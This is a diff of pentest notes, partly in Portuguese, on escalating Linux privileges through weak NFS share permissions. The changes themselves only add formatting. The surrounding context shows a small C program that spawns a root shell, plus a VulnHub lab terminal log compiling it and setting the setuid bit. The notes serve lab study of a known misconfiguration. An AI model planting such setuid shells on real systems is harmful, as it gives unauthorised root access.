@@ -1,4 +1,5 @@
 credits: s0wr0b1ndef , gajos112 and jivoi
+
 -----------------------------NFS DESCRIPTION-----------------------------
 
 1. Network FILE SYSTEM
@@ -66,6 +67,7 @@ See root squashing
 https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/
 ```
 --------------------------------------------------GET SHELL--------------------------------------------
+
 Veja: https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/
 
 Crie seu shell em C e compile:
@@ -82,7 +84,7 @@ int main(void)
 setuid(0); setgid(0); system("/bin/bash");
 }
 ```
-
+```
 root@an4kein:~/vulnhub/bravery/compile# vim rootshell.c^C
 root@an4kein:~/vulnhub/bravery/compile# cat rootshell.c 
 #include <stdio.h>
@@ -105,4 +107,5 @@ root@an4kein:~/vulnhub/bravery/compile# chmod u+s rootshell
 root@an4kein:~/vulnhub/bravery/compile# ls
 rootshell  rootshell.c
 root@an4kein:~/vulnhub/bravery/compile# 
+```
 
